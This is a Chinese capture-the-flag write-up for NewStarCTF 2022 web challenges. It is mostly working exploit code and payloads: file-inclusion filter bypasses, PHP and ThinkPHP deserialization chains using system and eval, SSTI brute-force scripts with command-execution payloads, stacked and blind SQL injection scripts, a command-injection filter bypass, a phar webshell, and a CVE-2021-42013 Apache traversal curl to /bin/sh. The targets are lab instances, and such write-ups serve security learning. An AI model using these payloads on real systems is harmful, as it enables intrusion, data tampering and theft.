## [week1]

全是基础题就不放wp了

## [week2]

### Word-For-You(2 Gen)

![image-20220927114126914](D:\Typora\note\CTF\web\比赛wp\NewStar2022.assets\4031454243.png)

sqlmap一把梭了

### IncludeOne

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include("seed.php");
//mt_srand(*********);
echo "Hint: ".mt_rand()."<br>";
if(isset($_POST['guess']) && md5($_POST['guess']) === md5(mt_rand())){
    if(!preg_match("/base|\.\./i",$_GET['file']) && preg_match("/NewStar/i",$_GET['file']) && isset($_GET['file'])){
        //flag in `flag.php`
        include($_GET['file']);
    }else{
        echo "Baby Hacker?";
    }
}else{
    echo "No Hacker!";
} Hint: 1219893521
```

很明显的种子碰撞了

![image-20221003184745317](D:\Typora\note\CTF\web\比赛wp\NewStar2022.assets\image-20221003184745317.png)

亮眼的**1145146**，就他了

![image-20221003184819373](D:\Typora\note\CTF\web\比赛wp\NewStar2022.assets\image-20221003184819373.png)

过滤了**base**，可以用**rot13**，NewStar插进去就行

```php
?file=php://filter/read=string.rot13/NewStar/resource=./flag.php
```

以前没遇到过，记住下咯

### UnserializeOne

麻了，这么简单的一个题因为一个蠢问题卡了半天

**题目源码**

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
#Something useful for you : https://zhuanlan.zhihu.com/p/377676274
class Start{
    public $name;
    protected $func;

    public function __destruct()
    {
        echo "Welcome to NewStarCTF, ".$this->name;
    }

    public function __isset($var)
    {
        ($this->func)();
    }
}

class Sec{
    private $obj;
    private $var;

    public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }

    public function __invoke()
    {
        echo file_get_contents('/flag');
    }
}

class Easy{
    public $cla;

    public function __call($fun, $var)
    {
        $this->cla = clone $var[0];
    }
}

class eeee{
    public $obj;

    public function __clone()
    {
        if(isset($this->obj->cmd)){
            echo "success";
        }
    }
}

if(isset($_POST['pop'])){
    unserialize($_POST['pop']);
}
```

**pop**

```php
<?php
class Start{
    public $name;
    protected $func;

    public function __construct($a)
    {
        $this->func=$a;
    }
}

class Sec{
    private $obj;
    private $var;
    public function __construct($a,$b)
    {
        $this->obj=$a;
        $this->var=$b;
    }

}

class Easy{
    public $cla;


}

class eeee{
    public $obj;

    public function __construct($a)
    {
        $this->obj=$a;
    }
}


$sec=new Sec('xlccccc','xlccccc');
$sta=new Start($sec);
$ee=new eeee($sta);
$ea=new Easy();

$arr=$ee;
$sec=new Sec($ea,$arr);
$sta2=new Start('xlccccc');
$sta2->name=$sec;

echo urlencode(serialize($sta2));
```

大致思路

```php
Start::__destruct ==>  Sec::__toString  ==>  Easy::__call  ==>  eeee::__clone  ==>  Start::__isset  ==>  Sec::__invoke
```

因为这个clone卡了好久

```php
 $this->cla = clone $var[0];
```

我是给var赋为数组，数组的第一个值为`new eee()`，但其实直接赋类就可以了
因为这个魔法函数是接受很多值的，并不是直接把接受的第二个值赋值为**$var**，而是把函数名后的很多值以数组的形式传给**$var**，所以你直接传类就好了

### graphQL

源码泄露

```php
<?php
error_reporting(0);
$id = $_POST['id'];
function waf($str)
{
    if (!is_numeric($str) || preg_replace("/[0-9]/", "", $str) !== "") {
        return False;
    } else {
        return True;
    }
}

function send($data)
{
    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => 'Content-type: application/json',
            'content' => $data,
            'timeout' => 10 * 60
        )
    );
    $context = stream_context_create($options);
    $result = file_get_contents("http://graphql:8080/v1/graphql", false, $context);
    return $result;
}

if (isset($id)) {
    if (waf($id)) {
        isset($_POST['data']) ? $data = $_POST['data'] : $data = '{"query":"query{\nusers_user_by_pk(id:' . $id . ') {\nname\n}\n}\n", "variables":null}';
        $res = json_decode(send($data));
        if ($res->data->users_user_by_pk->name !== NULL) {
            echo "ID: " . $id . "<br>Name: " . $res->data->users_user_by_pk->name;
        } else {
            echo "<b>Can't found it!</b><br><br>DEBUG: ";
            var_dump($res->data);
        }
    } else {
        die("<b>Hacker! Only Number!</b>");
    }
} else {
    die("<b>No Data?</b>");
}
?>
```

可以看到data也是可控的

而我们有一个api `http://graphql:8080/v1/graphql`

data可控的话，查询内容就可控了，然后稍微了解下**graphql**就好啦

[渗透测试之graphQL](https://blog.csdn.net/wy_97/article/details/110522150)

**payload**(搬pysnow师傅的qaq)

```php
data={"query":"{__schema {types {name}}}"}&id=1


data={"query":"\u0071\u0075\u0065\u0072\u0079\u007b\u005f\u005f\u0074\u0079\u0070\u0065\u0028\u006e\u0061\u006d\u0065\u003a\u0022\u0066\u0066\u0066\u0066\u006c\u006c\u006c\u006c\u0061\u0061\u0061\u0067\u0067\u0067\u0067\u005f\u0031\u006e\u005f\u0068\u0033\u0072\u0033\u005f\u0066\u006c\u0061\u0067\u0022\u0029\u007b\u0020\u0066\u0069\u0065\u006c\u0064\u0073\u0020\u007b\u0020\u0064\u0065\u0073\u0063\u0072\u0069\u0070\u0074\u0069\u006f\u006e\u0020\u006e\u0061\u006d\u0065\u0020\u0074\u0079\u0070\u0065\u0020\u007b\u0020\u006e\u0061\u006d\u0065\u0020\u006b\u0069\u006e\u0064\u0020\u006f\u0066\u0054\u0079\u0070\u0065\u0020\u007b\u0020\u006e\u0061\u006d\u0065\u0020\u006b\u0069\u006e\u0064\u0020\u0064\u0065\u0073\u0063\u0072\u0069\u0070\u0074\u0069\u006f\u006e\u007d\u007d\u007d\u007d\u007d"}&id=1
(query{__type(name:"ffffllllaaagggg_1n_h3r3_flag"){ fields { description name type { name kind ofType { name kind description}}}}})

data={"query":"query{ffffllllaaagggg_1n_h3r3_flag{flag}}"}&id=1

```

## [week3]

### BabySSTI_One

字符串拼接即可绕过所有过滤

找利用点脚本

```py
import requests
import time
import html

for i in range(0,300):
    payload='{{""["__cla""ss__"]["__m""ro__"][-1]["__subcl""asses__"]()[%s]}}'%i
    url='http://b5afd9a4-2731-4109-86c0-8f1d8de700c2.node4.buuoj.cn:81/?name='
    time.sleep(0.06)
    r=requests.get(url+payload)
    print(r.text)
    if "warnings.WarningMessage" in r.text:
        print(f'[+]:{i}')
        break
    print(f'[-]:{i}')
print('[+]done')
```



```py
{{""["__cla""ss__"]["__m""ro__"][-1]["__subcl""asses__"]()[165]["__in""it__"].__globals__.__builtins__['eval']("__import__('os').popen('nl /f*').read()")}}
```



### multiSQL

![image-20221004233536019](D:\Typora\note\CTF\web\比赛wp\NewStar2022.assets\image-20221004233536019.png)

**很明显的改成绩了**

过滤了`update select insert` 而且mysql10(盲注得到)，用不了table

那很明显只能**堆叠注入**了，不然拿不到数据库

```sql
username=1';show tables;
拿到表名 score

username=1';show columns from score;
拿到列名
username	varchar(255)	YES	
listen	int(11)	YES	
read	int(11)	YES	
write	int(11)	YES

1';delete from score where listen=11;
删除当前的成绩

replace into代替insert into
1';replace into score (username,listen,`read`,`write`) values ('火华',200,200,200);#
```

拿到flag

![image-20221004234555065](D:\Typora\note\CTF\web\比赛wp\NewStar2022.assets\image-20221004234555065.png)

### Maybe You Have To think More

乱改cookie，报错

![image-20221016235203633](D:\Typora\note\CTF\web\比赛wp\NewStar2022.assets\image-20221016235203633.png)

thinkphp版本已知

![image-20221016235235183](D:\Typora\note\CTF\web\比赛wp\NewStar2022.assets\image-20221016235235183.png)

cookie是入口

直接找网上链子打

```php
<?php
namespace think\process\pipes{

    use think\model\Pivot;

    class Windows
    {
        private $files = [];
        public function __construct(){
            $this->files[]=new Pivot();
        }
    }
}
namespace think{
    abstract class Model
    {
        protected $append = [];
        private $data = [];
        public function __construct(){
            $this->data=array(
              'feng'=>new Request()
            );
            $this->append=array(
                'feng'=>array(
                    'hello'=>'world'
                )
            );
        }
    }
}
namespace think\model{

    use think\Model;

    class Pivot extends Model
    {

    }
}
namespace think{
    class Request
    {
        protected $hook = [];
        protected $filter;
        protected $config = [
            // 表单请求类型伪装变量
            'var_method'       => '_method',
            // 表单ajax伪装变量
            'var_ajax'         => '',
            // 表单pjax伪装变量
            'var_pjax'         => '_pjax',
            // PATHINFO变量名 用于兼容模式
            'var_pathinfo'     => 's',
            // 兼容PATH_INFO获取
            'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
            // 默认全局过滤方法 用逗号分隔多个
            'default_filter'   => '',
            // 域名根，如thinkphp.cn
            'url_domain_root'  => '',
            // HTTPS代理标识
            'https_agent_name' => '',
            // IP代理获取标识
            'http_agent_ip'    => 'HTTP_X_REAL_IP',
            // URL伪静态后缀
            'url_html_suffix'  => 'html',
        ];
        public function __construct(){
            $this->hook['visible']=[$this,'isAjax'];
            $this->filter="system";
        }
    }
}
namespace{

    use think\process\pipes\Windows;

    echo base64_encode(serialize(new Windows()));
}
TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo0OiJmZW5nIjthOjE6e3M6NToiaGVsbG8iO3M6NToid29ybGQiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo0OiJmZW5nIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjg7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTA6e3M6MTA6InZhcl9tZXRob2QiO3M6NzoiX21ldGhvZCI7czo4OiJ2YXJfYWpheCI7czowOiIiO3M6ODoidmFyX3BqYXgiO3M6NToiX3BqYXgiO3M6MTI6InZhcl9wYXRoaW5mbyI7czoxOiJzIjtzOjE0OiJwYXRoaW5mb19mZXRjaCI7YTozOntpOjA7czoxNDoiT1JJR19QQVRIX0lORk8iO2k6MTtzOjE4OiJSRURJUkVDVF9QQVRIX0lORk8iO2k6MjtzOjEyOiJSRURJUkVDVF9VUkwiO31zOjE0OiJkZWZhdWx0X2ZpbHRlciI7czowOiIiO3M6MTU6InVybF9kb21haW5fcm9vdCI7czowOiIiO3M6MTY6Imh0dHBzX2FnZW50X25hbWUiO3M6MDoiIjtzOjEzOiJodHRwX2FnZW50X2lwIjtzOjE0OiJIVFRQX1hfUkVBTF9JUCI7czoxNToidXJsX2h0bWxfc3VmZml4IjtzOjQ6Imh0bWwiO319fX19fQ==
```

***改cookie**

`GET ?a=ls /`

根目录下是个假的flag，然后有几个mysql，那估计flag在数据库里面了

环境变量里面找到**flag**

### IncludeTwo

**pearcmd**

## [week4]

### So Baby RCE

```php
<?php
error_reporting(0);
if(isset($_GET["cmd"])){
    if(preg_match('/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\'|\]|"|<|>|`|\/| |\\\\|\*/i',$_GET["cmd"])){
       echo "Don't Hack Me";
    }else{
        system($_GET["cmd"]);
    }
}else{
    show_source(__FILE__);
}
```

`cd${IFS}..`来返回上级目录`&&`来联合执行命令`sort`或者`od`来看flag

```bash
cd${IFS}..%26%26cd${IFS}..%26%26cd${IFS}..%26%26cd${IFS}..%26%26sort${IFS}ffff?lllaaaaggggg
cd${IFS}..%26%26cd${IFS}..%26%26cd${IFS}..%26%26od${IFS}-t${IFS}d1${IFS}ffff?lllaaaaggggg
```

od查看的二进制ascii转成字符就行

### BabySSTI_Two

字符串拼接绕过

```python
import requests
import time

for i in range(0,300):
    payload="{{()['__clas''s__']['__mr''o__'][-1]['__subcla''sses__']()[%s]}}" % i
    print(payload)
    url='http://1ff626f8-0a3c-4a44-93a9-ac5e92da5205.node4.buuoj.cn:81/?name='
    time.sleep(0.06)
    r=requests.get(url+payload)
    if "os._wrap_close" in r.text:
        print(f'[+]:{i}')
        break
    print(f'[-]:{i}')
print('[+]done')

[+]:117
[+]done
```

```python
?name={{()['__clas''s__']['__mr''o__'][-1]['__subcla''sses__']()[117]['__in''it__']['__glo''bals__']['pop''en']('nl${IFS}/fla?_in_h3r3_52daad').read()}}
```

### UnserializeThree

看源码发现`class.php`

```php
<?php
highlight_file(__FILE__);
class Evil{
    public $cmd;
    public function __destruct()
    {
        if(!preg_match("/>|<|\?|php|".urldecode("%0a")."/i",$this->cmd)){
            //Same point ,can you bypass me again?
            eval("#".$this->cmd);
        }else{
            echo "No!";
        }
    }
}

file_exists($_GET['file']);
```

**file_exists**可以触发**phar**反序列化

换行符**%0a(\n)**被过滤了，但是回车符**%0d(\r)**没被过滤，构造个phar文件，后缀改为png

```php
<?php
class Evil{
    public $cmd="\reval(\$_POST[1]);";
    public function __destruct()
    {
        if(!preg_match("/>|<|\?|php|".urldecode("%0a")."/i",$this->cmd)){
            //Same point ,can you bypass me again?
            eval("#".$this->cmd);
        }else{
            echo "No!";
        }
    }
}

$evlil=new Evil();
$user->db = $evlil;
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");  //设置stub，增加gif文件头
$phar->setMetadata($user); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
```

![image-20221017103921093](D:\Typora\note\CTF\web\比赛wp\NewStar2022.assets\image-20221017103921093.png)

### 又一个SQL

有几个注入点，在留言处也可以sql注入，查询处也可以盲注，这里就无脑试了试的盲注

```python
import requests
import time

url='http://57bca42d-1969-4771-80c0-d6a1a9b5bda7.node4.buuoj.cn:81/comments.php'
a='[+]data:'
flag=''
for i in range(1,100):
    low=32
    high=128
    mid=(low+high)//2
    while(low<high):
        #data={"name":f"100||(ascii(substr(database(),{i},1))>{mid});\x00\x00"}
        #data={"name":f"100||(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{i},1))>{mid});\x00\x00"}
        #data={"name":f"100||(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='wfy_comments')),{i},1))>{mid});\x00\x00"}
        data={"name":f"100||(ascii(substr((select(group_concat(text))from(wfy_comments)where(id=100)),{i},1))>{mid});\x00\x00"}
        r=requests.post(url,data=data)
        time.sleep(0.1)
        if "f1ag_is_h" not in r.text:
            low=mid+1
        else:
            high=mid
        mid=(low+high)//2
    if(mid==32|mid==128):
        break
    flag+=chr(mid)
    print(a+flag)
```

### Rome

Rome反序列化，不会java，找了个exp但是题目好像不出网，也没回显，就没做了

## [week5]

文件上传**.htaccess getshell**

![image-20221017111553633](D:\Typora\note\CTF\web\比赛wp\NewStar2022.assets\image-20221017111553633.png)

### BabySSTI_Three

在上周**ssti**的基础上过滤了下划线，替换下划线为`\x5f`即可

```python
a="{{()['__clas''s__']['__mr''o__'][-1]['__subcla''sses__']()[117]['__in''it__']['__glo''bals__']['pop''en']('nl${IFS}/fla?_in_h3r3_52daad').read()}}"
b=''
for i in range(len(a)):
    if a[i]=='_':
        b+=r'\x5f'
    else:
        b+=a[i]
print(b)
```

然后rce即可

### Unsafe Apache

![image-20221017113317630](D:\Typora\note\CTF\web\比赛wp\NewStar2022.assets\image-20221017113317630.png)

可以看到**apache**版本，那就是**CVE-2021-42013**

直接利用相关payload即可

```bash
curl -v --data "echo;cat /ffffllllaaagggg_cc084c485d" 'http://node4.buuoj.cn:27084/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
```










